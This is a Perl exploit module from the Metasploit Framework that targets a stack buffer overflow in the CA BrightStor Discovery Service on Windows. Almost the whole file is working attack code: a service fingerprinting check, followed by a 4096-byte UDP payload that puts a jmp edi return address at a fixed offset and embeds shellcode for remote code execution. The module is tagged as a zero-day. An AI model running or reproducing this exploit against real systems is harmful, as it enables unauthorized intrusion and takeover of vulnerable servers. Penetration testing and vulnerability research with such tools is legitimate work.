
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_disco;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'CA BrightStor Discovery Service Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'Thor Doomen <syscall [at] inbox.lv>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'process' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 41524],
                },

    'Payload' => {
                    'Space'     => 2048,
                    'BadChars'  => "\x00",
				    'Keys'      => ['+ws2ord'],				 
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This modules exploits a simple stack overflow in the 
        CA BrightStor Discovery Service. 
    }),

    'Refs'    => [   ],
    'Targets' => [
                   ['cheyprod.dll 12/12/2003', 0x23808eb0], # jmp edi
                 ],
    'Keys'    => ['brightstor', 'arcserve','0day'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = 41523;
    
    # Connection #1 should not receive a response
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return $self->CheckCode('Connect');
    }
    
    $s->Send("META");
    my $res = $s->Recv(-1, 1);
    $s->Close;
        
    if ($res) {
        $self->PrintLine("[*] The discovery returned a strange response: $res");
    }

    # Connection #2 should receive the hostname of the target
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return $self->CheckCode('Connect');
    }
    
    $s->Send("hMETA");
    my $res = $s->Recv(-1, 1);
    $s->Close;
    
    if (! $res) {
        $self->PrintLine("[*] The discovery service did not respond to our query");
        return $self->CheckCode('Generic');
    }
    
    $self->PrintLine("[*] Discovery service active on host: $res");
    return $self->CheckCode('Detected');
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    my $target = $self->Targets->[$target_idx];
    

    $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

    my $s = Msf::Socket::Udp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
    );
    
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }
    
   
    my $boom = "X" x 4096;
    
    # esp @ 971
    # ret @ 968
    # edi @ 1046
    # end = 4092
    
    substr($boom, 968, 4, pack('V', $target->[1]));     # jmp edi
    substr($boom, 1046, length($shellcode), $shellcode);
      
    my $req = $boom;
    
    $self->PrintLine("[*] Sending " .length($req) . " bytes to remote host.");
    $s->Send($req);

    return;
}

1;
